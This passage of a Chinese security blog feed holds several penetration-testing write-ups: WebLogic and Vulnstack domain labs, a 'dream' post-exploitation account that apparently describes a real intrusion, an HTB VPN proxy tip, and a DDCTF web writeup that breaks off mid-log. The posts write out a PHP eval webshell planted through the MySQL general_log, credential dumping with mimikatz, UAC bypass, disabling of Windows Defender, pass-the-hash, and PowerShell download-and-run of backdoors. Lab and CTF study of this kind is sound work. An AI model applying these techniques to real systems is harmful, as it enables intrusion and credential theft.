7001Á´ØÂè£Áõ¥Êé•Âú®ÊµèËßàÂô®‰∏äÊâìÂºÄÂ∞±ÁúãÂà∞ÊòéÊòæÊòØWebLogicÁöÑ404È°µÈù¢ÔºåËæìÂÖ•Ë∑ØÂæÑ/console/login/LoginForm.jspÂ∞±ËÉΩWebLogicÁöÑÁôªÂΩïÁïåÈù¢„ÄÇ ÊâìÁÇπÊó¢ÁÑ∂Áî±WebLogicÔºåÈÇ£Â∞±È°∫ÁêÜÊàêÁ´†Âú∞ÊãøWeblogicScanÊâ´‰∫Ü‰∏ãÔºåÂ≠òÂú®CVE-2019-2725„ÄÇ ÂàöÂ•ΩmsfÈáåÊúâËøô‰∏™Ê¥ûÁöÑÂà©Áî®ËÑöÊú¨ÔºåÁõ¥Êé•‰∏ÄÊääÊ¢≠getshell„ÄÇÊ≥®ÊÑèËøôÈáåtargetÈªòËÆ§ÊòØunixÔºåÁî®ÂëΩ‰ª§set target 1Â∞±ÂèØ‰ª•ÊäätargetËÆæÁΩÆ‰∏∫Windows„ÄÇ ÊúÄÂêérunÂ∞±‰ºöËøîÂõû‰∏™meterpeterÁöÑsessionÔºåÊ≤°‰ªÄ‰πàÈöæÂ∫¶„ÄÇ BypassUAC‰∏™‰∫∫Ê®™ÂêëÁßªÂä®Êõ¥ÂñúÊ¨¢Áî®cobaltstrikeÔºåÊâÄ‰ª•Áî®msfÁöÑpayload_injectÊääsessionÊ¥æÁîüÂà∞cobaltstrike„ÄÇ Âú®cs‰∏äÁúãÂà∞sessionÁöÑÁî®Êà∑ÊòØadministratorÔºåÂáÜÂ§áÊî∂ÈõÜÂüü‰ø°ÊÅØÊó∂ÔºåÈÅáÂà∞‰∫ÜÊãíÁªùËÆøÈóÆÔºå‰∏ÄÂºÄÂßãËøò‰ª•‰∏∫ÊòØ360ÁöÑÈîÖÔºå‰ΩÜÂú®WEBÁöÑËôöÊãüÊú∫‰∏äÔºåÁúã360‰∏ç‰∏∫ÊâÄÂä®„ÄÇÊü•‰∏ãËµÑÊñôÂæóÁü•ÊòØUACÁöÑÈóÆÈ¢òÔºåÁî®cs4.0ÊèêÊùÉÊ®°ÂùóÈáåÁöÑsvc-exeÂç≥ÂèØÁªïËøáUAC„ÄÇ Â•ΩÂ•áËøô‰∏™svc-exeÊòØ‰ªÄ‰πàÂéüÁêÜÔºåÂèàÊêú‰∫Ü‰∏ãË¥®ÊñôÂæóÂà∞ËøôÊ†∑ÁöÑËß£ÈáäÔºöpsexecÊâìËá™Â∑±„ÄÇ ‰ø°ÊÅØÊî∂ÈõÜÁªïËøáUACÂêéÔºåÈ°∫Âà©Êî∂ÈõÜÂà∞‰∫ÜÂüü‰ø°ÊÅØÔºåÂΩìÂâçÁî®Êà∑Â∞±ÊòØÂüüÁÆ°ÁêÜÂëòÔºåÂüüÊéßÂú®Èáå‰∏ÄÂè∞Êú∫Â≠ê„ÄÇ mimikatzËØª‰∫Ü‰∏ÄÊ≥¢ÂØÜÁ†ÅÔºåÈ°∫‰æøÁøª‰∫ÜÁøª‰∏ªÊú∫‰∏äÁöÑÊñá‰ª∂ÔºåÊÑüËßâÊ≤°‰ªÄ‰πàÊïèÊÑü‰ø°ÊÅØ„ÄÇipconfigÁúã‰∫Ü‰∏ãÂèà‰∏§‰∏™ÁΩëÊÆµÔºå10.10.10.1/24ÁöÑÂ∞±ÊòØÂÜÖÁΩëÁΩëÊÆµ„ÄÇarpÊâ´Êèè‰∏ãÂÜÖÁΩëÔºåÊúâ‰∏Ä‰∏™ÂüüÊéßÔºåÂè¶‰∏Ä‰∏™Â∞±ÊòØÂüüÊàêÂëò‰∏ªÊú∫„ÄÇ Ê®™ÂêëÁßªÂä®administratorÊòØÂüüÁÆ°ÁêÜÂëòÔºå‰ΩøÁî®administartorÁöÑÂá≠ËØÅÊ®™ÂêëÁßªÂä®Â∞±Ë°å‰∫ÜÔºå‰ΩÜËøôÈáåÈÅáÂà∞‰∏™ÂùëÔºåÊ≤°ÁªïËøáUAC‰πãÂâçÊ®™ÂêëÁßªÂä®ÈÉΩÂ§±Ë¥•‰∫ÜÔºåÊàëËøò‰ª•‰∏∫ÊòØËÆæÁΩÆ‰∫ÜÊüê‰∫õÁ≠ñÁï•ÁöÑÈóÆÈ¢ò„ÄÇ„ÄÇ„ÄÇ ‰ΩøÁî®csÁöÑpsexecËøõË°åÊ®™ÂêëÁßªÂä®ÔºåSessionÂàôÈÄâÊã©SYSTEMÊùÉÈôêÁöÑsession„ÄÇÂú®ÂÜÖÁΩë‰∏çÂá∫ÁΩëÊÉÖÂÜµ‰∏ãÔºå‰∏äÁ∫øDCÂè™ÈúÄË¶ÅÂÉè‰∏äÂõûÈÇ£Ê†∑Áî®smbÁöÑListenerÂç≥ÂèØ„ÄÇ PCÁöÑ‰∏äÁ∫øÊìç‰Ωú‰πüÂ∑Æ‰∏çÂ§öÔºåÁé∞Âú®ÊâÄÊúâÁöÑ‰∏ªÊú∫ÈÉΩ‰∏ä‰∫ÜÁ∫ø‰∫Ü„ÄÇ È°∫‰æøËØ¥‰∏ãDC.de1ay.comËøòÂ≠òÂú®MS17-010Ôºå‰ΩÜÊòØÁî®msfÁöÑÂëΩ‰ª§ÊâßË°åÁöÑpayloadÊâì‰∏ÄÊ¨°ÔºåsessionÂ∞±Êñ≠‰∏ÄÊ¨°ÔºåÂ§™ÈöæÂèó‰∫Ü„ÄÇ ËøòÊúâÊúÄËøëÈÇ£‰∏™Zerologon‰πüÊòØÂèØ‰ª•ÁöÑÔºåÊØïÁ´üÊòØÊúÄÊñ∞ÁöÑÊ¥ûÔºå‰ΩÜÈÇ£socks‰ª£ÁêÜÊ≠ªÊ¥ªËøû‰∏ç‰∏äÂÜÖÁΩë/ÊçÇËÑ∏„ÄÇÂè™Â•ΩÊääÁΩëÂç°Áõ¥Êé•Êé•Âà∞ÂÜÖÁΩë„ÄÇ]]></content>
      <categories>
        <category>Èù∂Êú∫</category>
      </categories>
      <tags>
        <tag>Âüü</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[[ÂüüÊ∏óÈÄè]Vulnstack1_walkthrough]]></title>
    <url>%2F2020%2F10%2F13%2F%5B%E5%9F%9F%E6%B8%97%E9%80%8F%5DVulnstack1_walkthrough%2F</url>
    <content type="text"><![CDATA[ÂâçË®ÄÊúÄËøëÊÉ≥ÊâæÊâæÈùûIIS‰∏≠Èó¥‰ª∂ÁöÑwindowsÂÆûÊàòÊù•ÊêûÊêûÔºå‰ΩÜÊòØÊöÇÊó∂Ê≤°ÊâæÂà∞Ôºå‰∏çËøáÊó†ÊÑè‰∏≠ÁúãÂà∞Á∫¢Êó•ÂÆâÂÖ®ÂÅöÁöÑÔºåÁªÉ‰π†ÂüüÊ∏óÈÄèÁöÑwindowsÈù∂Êú∫ÔºövulnstackÔºåÊÑüËßâ‰∏çÈîô„ÄÇ ÁéØÂ¢ÉÊê≠Âª∫ÊåâÁÖßÁ∫¢Êó•ÂÆâÂÖ®ÂÖ¨‰ºóÂè∑ÁöÑÊñáÁ´†ÔºåÂÖàÂú®vmwareÁöÑËôöÊãüÁΩëÁªúÁºñËæëÂô®ÁöÑÊ∑ªÂä†‰∏§‰∏™‰ªÖ‰∏ªÊú∫ÁöÑËôöÊãüÁΩëÁªúÔºåÁΩëÊÆµÂàÜÂà´‰∏∫192.168.52.0Âíå192.168.72.0„ÄÇ Windows 7 x64ÂÜçÊ∑ªÂä†Â§ö‰∏Ä‰∏™ÁΩëÂç°ÔºåÂàÜÂà´Ëøû‰∏äVMnet1ÂíåVMnet2ÔºõWin2k3 MetasploiteableÂíåWindows Server 2008 R2 x64Ëøû‰∏äVMnet1ÔºõÊúÄÂêéÊîªÂáªËÄÖ‰∏ªÊú∫ÊúÄÂêéËøû‰∏äVMnet2„ÄÇ ÊúÄÂêéÁöÑÊúÄÂêéËøòÈúÄË¶ÅÁî®ÂØÜÁ†Åhongrisec@2019ÁôªÂΩïÂà∞Windows 7 x64ÔºåÂú®C:\phpStudyÁõÆÂΩïÈáåÔºåÊâãÂä®ÂêØÂä®phpStudy„ÄÇ Âà©Áî®ËøáÁ®ã‰ø°ÊÅØÊî∂ÈõÜnmapÊâ´‰∫Ü‰∏ãÂèëÁé∞ÂºÄÂêØ‰∫Ü80Âíå3306Á´ØÂè£ÔºåphpStudyÁöÑmysqlÁî®Êà∑ÂêçÂíåÈªòËÆ§ÂØÜÁ†ÅÈÉΩ‰∏∫rootÔºå‰º∞ËÆ°ÈÉΩÊ≤°ÊîπÔºåÁõ¥Êé•ËÉΩÂú®Â§ñÁΩëËøû‰∏ämysql„ÄÇ httpÊúçÂä°ÊâìÂºÄÊòØ‰∏Ä‰∏™phpStudyÁöÑÊé¢ÈíàÔºåÊ≥ÑÈú≤‰∫ÜwebÁõÆÂΩïÁöÑÁªùÂØπË∑ØÂæÑ„ÄÇ Êâ´ÁõÆÂΩïÂ∞±Êâ´Âá∫Êù•‰∏™phpmyAdminÂíåphpinfo„ÄÇ ÊâìÁÇπphpmyAdminÁî®‰ºóÊâÄÂë®Áü•ÁöÑÁî®Êà∑ÂíåÂØÜÁ†ÅrootÔºåÂ∞±ËÉΩÁôªÂΩïËøõÂéª„ÄÇphpStudyÁöÑmysql‰πüÊòØÈ´òÊùÉÈôêËøêË°åÁöÑÔºåÂÜôÊñá‰ª∂getshellÂ∫îËØ•Ê≤°‰ªÄ‰πàÈóÆÈ¢ò„ÄÇ into outfileÂú®ËøôÈáåÁî®‰∏ç‰∫ÜÔºåÁî®‰∏ãÈù¢ÁöÑpayload‰∏ÄÊ¨°ÊÄßÂÜôÂ•Ωshell„ÄÇ 1234set global general_log = &apos;ON&apos;;set global general_log_file = &apos;C:/phpStudy/WWW/cmd.php &apos;;select &apos;&lt;?php @eval($_POST[&quot;cmd&quot;]);?&gt;&apos;;set global general_log = &apos;OFF&apos;; ËöÅÂâëËøû‰∏äÂéªÂèëÁé∞ËøòÊúâÂ§á‰ªΩÂíå‰∏Ä‰∏™cmsÔºåÂ≠óÂÖ∏Â∞èÊ≤°ÊúâÊâ´Âà∞ÔºåcmsËøô‰∏™ÊñπÂêëÂ∫îËØ•‰πüËÉΩgetshellÔºå‰ΩÜËøôÈáåÂÖàÊåâ‰∏ã‰∏çË°®„ÄÇ Ê®™ÂêëÁßªÂä®Âú®ËöÅÂâëÁöÑÊ®°ÊãüÁªàÁ´ØÁúã‰∫Ü‰∏ãÔºåÊ≤°ÊúâÊùÄËΩØÔºåÂèØ‰ª•Áõ¥Êé•powershellÊó†Êñá‰ª∂‰∏äÁ∫ø„ÄÇ ‰πüÂõ†‰∏∫ÊòØphpStudyÔºåÊâÄ‰ª•webshell‰πüÁõ¥Êé•ÊòØÈ´òÊùÉÈôêÔºåÊèêÊùÉÈÉΩÁúÅ‰∫Ü„ÄÇÁúã‰∫Ü‰∏ãÂ≠òÂú®ÂüüÔºåÂΩìÂâçË¥¶Âè∑Â∞±ÊòØÂüüÁÆ°ÁêÜÂëòÔºåÂüüÂÜÖ‰∏ªÊú∫Êúâ‰∏âÂè∞„ÄÇ 12net group "domain admins" /domainnet group "domain computers" /domain Êúâ‰∫ÜÂüüÁÆ°ÁêÜÂëòË¥¶Âè∑ÔºåËÆ≤ÈÅìÁêÜÁõ¥Êé•Ê®™ÂêëÁßªÂä®Â∞±Ë°åÔºå‰ΩÜËøôÈáåÂÜÖÁΩë‰∏ªÊú∫‰∏çÂá∫ÁΩëÔºåËøòË¶ÅÂÅöÁÇπÂâçÁΩÆÊìç‰Ωú„ÄÇÂØπÊØî‰∫ÜÂá†ÁßçÊñπÊ≥ïÔºåËßâÂæósmbÁÆ°ÈÅìÊ≠£ÂêëËøûÊé•ÊØîËæÉÁÆÄ‰æø„ÄÇ Âú®ÁõëÂê¨ÂàóË°®Ê∑ªÂä†‰∏Ä‰∏™SMBÁöÑBeacon„ÄÇ ÈÄâÊã©ÂΩìÂâçsessionÔºåÊ¥æÁîüÂà∞SMB Beacon„ÄÇ psexecÊ®™ÂêëÁßªÂä®ÁõëÂê¨ÈÄâsmbÔºåsessionÈÄâÊ¥æÁîüÂá∫Êù•ÁöÑsession„ÄÇ Êé•ÁùÄÁ≠â‰∏ÄÂ∞è‰ºöÂ∞±ËÉΩ‰∏äÁ∫ø‰∫ÜÔºåÂëΩ‰ª§ËÉΩÊ≠£Â∏∏ÊâßË°å„ÄÇ ÂΩìÁÑ∂Èô§‰∫ÜÁî®ÂüüÁÆ°ÁêÜÂëòÊ®™ÂêëÁßªÂä®ÔºåMS17-010‰πüÂæàÂèØËÉΩËÉΩÊâìÂæóÂà∞„ÄÇCS‰∏äÁöÑMS17-010ËØ¥ÂÆûËØùÁ°ÆÂÆû‰∏çÂ•ΩÁî®ÔºåÊâÄ‰ª•ÂÖàÊ¥æÁîü‰∏™sessionÂà∞msf‰∏äÔºåÁî®autorouterÂÅöÂ•ΩË∑ØÁî±ÂêéÔºåÁî®auxiliary/admin/smb/ms17_010_commandÊ®°ÂùóÔºå‰∏çÂá∫ÊâÄÊñôÂ∞±ÊâìÂà∞‰∫Ü„ÄÇÂÖ∂‰ªñÊ®°ÂùóÊâì‰∏çÂä®ÔºåÊúâÊó∂ÂÄôÁîöËá≥ÂõûÈáçÂêØÔºå‰πüÂ∞±ÁÆó‰∫Ü„ÄÇ]]></content>
      <categories>
        <category>Èù∂Êú∫</category>
      </categories>
      <tags>
        <tag>Âüü</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Áî®‰∏çÂèØÊèèËø∞ÁöÑËΩØ‰ª∂ÂÅöHTBÁöÑÂâçÁΩÆ‰ª£ÁêÜ]]></title>
    <url>%2F2020%2F10%2F05%2F%E7%94%A8%E4%B8%8D%E5%8F%AF%E6%8F%8F%E8%BF%B0%E7%9A%84%E8%BD%AF%E4%BB%B6%E5%81%9AHTB%E7%9A%84%E5%89%8D%E7%BD%AE%E4%BB%A3%E7%90%86%2F</url>
    <content type="text"><![CDATA[ÂâçË®Ä‚ÄãÂâçÊÆµÊó∂Èó¥ÊâìHTBÔºå‰∏ÄÁõ¥ÂèóÂà∞ÈÄüÂ∫¶ÊÖ¢ÁöÑÂõ∞Êâ∞ÔºåÊúâÊó∂Á≠âÂæÖ‰∏Ä‰∫õÈùôÊÄÅËµÑÊ∫êÂä†ËΩΩÈÉΩË¶ÅÂ•Ω‰πÖ„ÄÇÁî±‰∫é‰∏Ä‰∫õ‰ºóÊâÄÂë®Áü•ÁöÑÂéüÂõ†ÔºåËÄå‰∏îHTBÊèê‰æõÁöÑ‰ª£ÁêÜÊòØOpenVpnÔºåÊõ¥ÊòØË¢´ÈáçÁÇπÂÖ≥Ê≥®Ôºå‰∫éÊòØÊë∏Á¥¢Âá∫Êù•ÁªôHTBÁöÑOpenVpnÂä†‰∏™ÂâçÁΩÆ‰ª£ÁêÜÁöÑÊñπÊ≥ïÔºåÂèØ‰ª•Âä†Âø´ÁÇπÈÄüÂ∫¶„ÄÇ ÂáÜÂ§áÂ∑•‰Ωú ‰∏çÂèØÊèèËø∞ËΩØ‰ª∂ÈÖ∏ÈÖ∏‰π≥ÂíåË¥¶Âè∑‰∏Ä‰∏™ÔºàÊàëÁî®ÁöÑÈÖ∏ÈÖ∏‰π≥ÔºåÁî®V2‰ªÄ‰πàÁöÑÂ∫îËØ•‰πüÊòØÂèØ‰ª•ÁöÑÂêßÔºâ Âè≥ÈîÆÈÖ∏ÈÖ∏‰π≥ÁöÑËøêË°åÂõæÊ†áÔºåÁÇπÂáªÁ´ØÂè£ËÆæÁΩÆ„ÄÇÂÉè‰∏ãÂõæ‰∏ÄÊ†∑ÔºåÊ∑ªÂä†‰∏Ä‰∏™Á´ØÂè£ËÆæÁΩÆ„ÄÇÂºÄÂÖ≥ÊâìÂºÄ„ÄÅÁ±ªÂûãÈÄâÁ´ØÂè£ËΩ¨ÂèëÔºåÁõÆÊ†áÂú∞ÂùÄÁî®ÁöÑHTBËäÇÁÇπÁöÑÂüüÂêçÔºåÊåâÂÆûÈôÖÊÉÖÂÜµÂ°´ÔºåÊú¨Âú∞Á´ØÂè£ÈöèÊÑè„ÄÇ ‰øÆÊîπÈÖçÁΩÆÊñá‰ª∂ÊåâÁÖßÂÆòÁΩë‰∏äÁöÑÊåáÂºï‰øÆÊîπÂçèËÆÆ‰∏∫tcpÔºàÈÖ∏ÈÖ∏‰π≥ÈªòËÆ§Âè™ÊîØÊåÅtcpÔºâ„ÄÇ ‰øÆÊîπudpÂçèËÆÆ‰∏∫tcp„ÄÅ‰øÆÊîπremoteÁöÑÁ´ØÂè£‰∏∫Á´ØÂè£ËΩ¨ÂèëÁöÑÊú¨Âú∞ÁõëÂê¨Á´ØÂè£„ÄÅÊúçÂä°Âô®Âú∞ÂùÄÊîπ‰∏∫Á´ØÂè£ËΩ¨ÂèëÁõëÂê¨ÁöÑÁΩëÂç°ipÂú∞ÂùÄ„ÄÅ‰øÆÊîπ&lt;tls-auth&gt;Ê†áÁ≠æ‰∏∫&lt;tls-crypt&gt;„ÄÇ ‰øÆÊîπÂ•ΩÂπ∂‰øùÂ≠òÔºåÂêØÂä®openvpnÂ∫îËØ•Â∞±ËÉΩÊ≠£Â∏∏ËøêË°å‰∫ÜÔºåËôΩÁÑ∂ËøòÊòØÂæàÊÖ¢Ôºå‰ΩÜÈùôÊÄÅÊñá‰ª∂Ëá≥Â∞ëËøòËÉΩÂä†ËΩΩÔºåËøòÊòØÂÖÖÈí±ÊâçËÉΩÂèòÂæóÊõ¥Âº∫Âïä„ÄÇ]]></content>
      <categories>
        <category>Êó•Â∏∏</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Á¨¨‰∫åÊ¨°Ê¢¶ÈáåÁöÑÂêéÊ∏óÈÄè]]></title>
    <url>%2F2020%2F09%2F11%2F%E7%AC%AC%E4%BA%8C%E6%AC%A1%E6%A2%A6%E9%87%8C%E7%9A%84%E5%90%8E%E6%B8%97%E9%80%8F%2F</url>
    <content type="text"><![CDATA[ÂâçË®ÄÁªß‰∏äÊ¨°ÂÅö‰∫Ü‰∏Ä‰∏™ÂêéÊ∏óÈÄèÁöÑÊ¢¶‰πãÂêéÔºåÊúÄËøëÂèàÂÅö‰∫Ü‰∏Ä‰∏™ÂêåÊ†∑ÊòØÂêéÊ∏óÈÄèÁöÑÊ¢¶ÔºåÂêéÈù¢Â∞±ÊòØÈÉΩÊòØ‰∏Ä‰∫õÂü∫Á°ÄÊìç‰Ωú„ÄÅÊ≤°‰ªÄ‰πàÂπ≤Ë¥ßÁöÑÊ∞¥ÊñáÔºåÂú®Ê¢¶ÈáåËøòÊòØËøô‰πàËèú„ÄÇ„ÄÇ„ÄÇÂëú~Âëú~Âëú~ ‰ø°ÊÅØÊî∂ÈõÜÂÖàÊî∂ÈõÜÂüüÂÜÖ‰ø°ÊÅØÔºåÂ≠òÂú®ÂüüÔºåÂüüÊéßÂíåÂüüÁÆ°ÁêÜÂëòÂêÑ‰∏§‰∏™„ÄÇ 123net time /domainnet group "domain controllers" /domainnet group "domain admins" /domain Âú®Êî∂ÈõÜ‰∏ãÁΩëÁªú„ÄÅË°•‰∏ÅÂíåÊùÉÈôêÁöÑ‰ø°ÊÅØ„ÄÇ 123ipconfig /allsysteminfowhoami /priv ÂàöÂ•ΩÂÖ∂‰∏≠‰∏ÄÂè∞ÂüüÊéß‰∏ªÊú∫Â∞±ÊòØÂΩìÂâçËøôÂè∞Êú∫Â≠êÔºåË°•‰∏ÅÊâìÂæóÊØîËæÉÂã§ÔºåÂèàÊòØÂºÄÂêØ‰∫ÜSeImpersonateProvilegeÔºåPotatoÁ≥ªÂàóÊèêÊùÉÂç≥ÂèØ„ÄÇ ÊèêÂèñÊü•ÁúãËøõÁ®ãÂèëÁé∞‰∫ÜWinDefendÔºåÊâæ‰∫Ü‰∏™ÂÖçÊùÄÁöÑBadPotatoÊâçÊèê‰∫ÜÊùÉ„ÄÇ 1tasklist /svc | findstr WinDefend Áî®BadPotatoËøêË°å‰∫ÜCSÁöÑÂÖçÊùÄÂêéÈó®‰∏ä‰∫ÜÁ∫øÔºåÈ°∫‰æøÊ¥æÁîüÂà∞‰∫ÜmsfÈáå„ÄÇmimikatzËØª‰∫Ü‰∏ÄÊ≥¢ÂØÜÁ†ÅÔºåÁî±‰∫éÁ≥ªÁªüÊòØWindows2012ÔºåÊâÄ‰ª•Ê≤°ÊúâËØªÂà∞ÊòéÊñáÂØÜÁ†Å„ÄÇ Êé•ÁùÄÂèàÁî®Lazagne.exeËØª‰∫Ü‰∏ÄÊ≥¢ÂØÜÁ†ÅÔºå‰ΩÜÊòØÈô§‰∫ÜNTLM‰πãÂ§ñÂπ∂Ê≤°ÊúâËØªÂà∞ÂÖ∂‰ªñÁöÑÂØÜÁ†Å„ÄÇ Ê®™ÂêëÁßªÂä®ËôΩÁÑ∂ÂÅö‰∫ÜÈùôÊÄÅÂÖçÊùÄÔºå‰ΩÜÊòØÂæÆËΩØÁöÑÂä®ÊÄÅÊü•ÊùÄÊå∫Âº∫ÁöÑÔºåÂØπÂ§ñÊâ´Êèè‰∏ç‰∏Ä‰ºöÂ∞±ÁªôWinDefendÊùÄ‰∫ÜÔºåÁªôÊ®™ÂêëÁßªÂä®ÈÄ†Êàê‰∫Ü‰∏çÂ∞ëÂõ∞Êâ∞„ÄÇ‰ΩÜ‰∏ç‰ºöÊã¶Êà™Ê∑ªÂä†Áî®Êà∑ÂíåÊ∑ªÂä†Áî®Êà∑Âà∞AdministratorsÁªÑÔºåËÄå‰∏î‰∏äÈù¢ÊúâÂºÄ‰∫ÜËøúÁ®ãÊ°åÈù¢ÔºåÂèØ‰ª•Áõ¥Êé•ËøúÁ®ãÊ°åÈù¢Ëøû‰∏äÂéªÔºåÊääWinDefendÁªôÈ≤®‰∫Ü„ÄÇ ÂêéÈù¢Â∏∏ËßÑÁöÑÂàõÂª∫Áî®Êà∑Âä†ÂÖ•Âà∞AdministratorsÁªÑÔºåCSÂºÄÂêØsocks‰ª£ÁêÜÔºå‰ΩÜËøûÊé•ËøúÁ®ãÊ°åÈù¢Êó∂ÂÄôÈÅáÂà∞NLAËÆ§ËØÅÈóÆÈ¢òÔºåÊü•ËØ¢Âà∞freerdpÊîØÊåÅNLAÔºåÁî®freerdpËß£ÂÜ≥„ÄÇ ËôΩÁÑ∂ËøúÁ®ãÊ°åÈù¢Ëøõ‰∫ÜÂéªÔºå‰ΩÜÊòØWinDefendÈÄöÂ∏∏Âè™ÊúâÂêØÂä®Ëøô‰∏™ÊúçÂä°ÁöÑÁî®Êà∑ÊâçËÉΩÂÅúÊ≠¢Ôºå‰∏ÄËà¨ÊòØsystemÁî®Êà∑ÔºåÂ•áÊÄ™ÁöÑÊòØÁî®BadPotatoÊâßË°åÂÅúÊ≠¢ÊúçÂä°ÁöÑÂëΩ‰ª§ËøòÊòØÊ≤°Ê≥ïÂÖ≥Èó≠ÔºåÂ•ΩÂú®Âú®superuser‰∏äÊâæÂà∞‰∫Ü‰∏™ÂÖ≥Èó≠WinDefendÁöÑÊñπÊ≥ï„ÄÇ ÊâìÂºÄgpedit.mscÔºåÂàáÊç¢Âà∞Computer Configuration &gt; Administrative Templates &gt; Windows Components &gt; Windows DefenderÔºåTurn off Windows DefenderËÆæÁΩÆ‰∏∫Enable„ÄÇ ËôΩÁÑ∂ÊòØÊ≤°ÊäìÂà∞ÊòéÊñáÂØÜÁ†ÅÔºå‰ΩÜÊòØÊúâNTLMÔºåÂèØÁî®Âà©Áî®Pass The HashÊ®™ÂêëÁßªÂä®„ÄÇÁî±‰∫éCSÁöÑÊ®™ÂêëÁßªÂä®ÊòØÁõ¥Êé•‰º†ÂêéÈó®ÁöÑÔºåÂêéÈù¢Áü•ÈÅìÂüüÂÜÖ‰∏ªÊú∫ÂÖ®ÈÉΩÊúâÊùÄËΩØÔºåÊâìÂÆå‰πãÂêéÂÖ®ÈÉΩÊ≤°‰∏äÁ∫ø„ÄÇ ÊâÄ‰ª•‰∏ä‰º†‰∫Ü‰∏™Invoke-TheHashÊù•PTHÔºåÂ§ßÈÉ®ÂàÜ‰∏ªÊú∫ÈÉΩËÉΩÊâßË°åÂëΩ‰ª§„ÄÇ Áî®powershell‰∏ãËΩΩCSÁöÑÂÖçÊùÄÂêéÈó®Âπ∂ÊâßË°åÔºåÊàêÂäüËÆ©ÂüüÂÜÖ‰∏ªÊú∫ÈÉΩ‰∏ä‰∫ÜÁ∫ø„ÄÇ ÂêéÁª≠ÁöÑÊ®™ÂêëÁßªÂä®Âú®‰∏äÁ∫øÁöÑ‰∏ªÊú∫‰∏äÊî∂ÈõÜÂà∞‰∏ÄÂ†ÜtxtÂíåweb.configÈáåÁöÑÂØÜÁ†ÅÔºåÂØπ1433„ÄÅsshÂíåRDPÁ≠âÊúçÂä°ËøõË°åÁàÜÁ†¥ÔºåÂèØÊÉúÂπ∂Ê≤°ÊúâÁàÜÁ†¥ÂæóÂà∞„ÄÇÊâ´‰∫Ü‰∏ÄÈÅçÂÜÖÁΩëwebÊúçÂä°ÔºåÈÉΩÊòØ‰∫õÁΩëÁªúËÆæÂ§áÔºåËøòÊúâ‰∏Ä‰∏™ÂºÄÊ∫êÁöÑÂêéÂè∞ÔºåÂº±Âè£‰ª§Ëøõ‰∫ÜÂÖ∂‰∏≠‰∏Ä‰∏™Ôºå‰ΩÜÊòØÊ≤°‰ªÄ‰πàÊî∂Ë¥ß„ÄÇ ÂêéËÆ∞ÊÄªÁªì‰∏ãËøôÊ¨°ÁöÑÊ∏óÈÄèÊµÅÁ®ãÔºö getshell-&gt;Âüü‰ø°ÊÅØÊî∂ÈõÜ-&gt;ÊèêÊùÉ-&gt;Ëé∑ÂèñNTLM-&gt;ÂÖ≥Èó≠WinDefend-&gt;PTHÊ®™ÁßªÂä®]]></content>
      <categories>
        <category>Ê∏óÈÄèÊµãËØï</category>
      </categories>
      <tags>
        <tag>Âüü</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DDCTF2020 WEB writeup]]></title>
    <url>%2F2020%2F09%2F07%2FDDCTF2020_WEB_writeup%20%2F</url>
    <content type="text"><![CDATA[ÂâçË®ÄDDCTFÊòØ‰∏™Êå∫Â•ΩÁöÑÊØîËµõÔºåÈ¢òÁõÆË¥®ÈáèÂæàÈ´òÔºåpyÁ®ãÂ∫¶Âæà‰Ωé„ÄÇ‰∏çÁü•ÈÅì‰ªäÂπ¥‰∏∫‰ªÄ‰πàËøô‰πàÂ∞ëÈòü‰ºçÁ≠æÂà∞ÔºåÈöæÈÅìË∑üÂà´ÁöÑÊØîËµõÊíûËΩ¶‰∫ÜÔºü WebÁ≠æÂà∞È¢òÊ†πÊçÆÊèêÁ§∫ÂæóÁü•ÊúâÊù•‰∏™api„ÄÇ 12345678910111213141516171819202122232425 Interface documentation- login interface[-][Safet Reminder]The Private key cannot use request parameterRequestMethod | POSTURL | http://117.51.136.197/admin/loginParam | username str | pwd strResponsetoken str | auth(Certification information)- auth interfaceRequestMethod | POSTURL | http://117.51.136.197/admin/authParam | username str | pwd str | token strResponseurl str | client download link+------------------+ +----------------------+ +--------------------+| | | | | || +----------------&gt; +----------------&gt; || Client(Linux) | | Auth/Command | | minion || &lt;----------------+ +&lt;---------------+ || | | | | |+------------------+ +----------------------+ +--------------------+ ËÆøÈóÆÁ¨¨‰∏Ä‰∏™apiÔºåÂæóÂà∞‰∏Ä‰∏≤Â≠óÁ¨¶‰∏≤ÔºåËß£Á†ÅÂæóÁü•ÊòØjwt token„ÄÇ Â∞ùËØï‰∏ÄËΩÆjwtÁöÑÂ∏∏ËßÑÊìç‰ΩúÔºåÊúÄÂêéÁî®jwtcrackÁàÜÁ†¥Âá∫‰∫ÜÂØÜÈí•Ôºå‰øÆÊîπpayload‰∏≠ÁöÑuserRole‰∏∫ADMINÊèê‰∫§Âà∞Á¨¨‰∫å‰∏™apiÂ§Ñ„ÄÇ ÂæóÂà∞‰∫ÜclientÁöÑ‰∏ãËΩΩÂú∞ÂùÄ„ÄÇ ËøêË°å‰∏ãclientÔºåÂèëÁé∞Âπ∂Ê≤°ÊúâÁî®Êà∑‰∫§‰∫íÂäüËÉΩÔºåÂëΩ‰ª§ÈÉΩÊòØÁ°¨ÁºñÁ†ÅÂú®Á®ãÂ∫èÈáå„ÄÇ 12345678910111213141516171819202122232425262728293031‚îå‚îÄ[p1ay2win@parrot]‚îÄ[~/Desktop/Tools/c-jwt-cracker-master]‚îî‚îÄ‚îÄ? $/tmp/client 2020/09/07 00:50:15 ____ _ ____ _ ____ _____ _____ ____ ____ ____ ____ / _ \/ \/ _ \/ \/ _\/__ __\/ / /_ \/ _ \/_ \/ _ \| | \|| || | \|| || / / \ | __\_____ / /| / \| / /| / \|| |_/|| || |_/|| || \__ | | | | \____\/ /_| \_/|/ /_| \_/|\____/\_/\____/\_/\____/ \_/ \_/ \____/\____/\____/\____/ 2020/09/07 00:50:15 +---------------------------------------------------+|Flag Path := /home/dc2-user/flag/flag.txt ||Á≠æÂêçÊ†ºÂºè := command|time_stamp |+---------------------------------------------------+2020/09/07 00:50:15 +------------------+ +----------------------+ +--------------------+| | | | | || +----------------&gt; +----------------&gt; || Client | | Auth/Command | | minion || &lt;----------------+ +&lt;---------------+ || | | | | |+------------------+ +----------------------+ +--------------------+2020/09/07 00:50:15 [*]Start ping master...2020/09/07 00:50:15 [-]http://117.51.136.197/server/health connect succuess2020/09/07 00:50:15 [*]Start send command to minions...2020/09/07 00:50:15 [+]get sign:Q4OkAWjsnkfxKiqMv5wuFRXjgS/gGEFalDPS5IfuGww=, command:&apos;DDCTF&apos;, time_stamp:15994110152020/09/07 00:50:15 [+]send command url http://117.51.136.197/server/command and 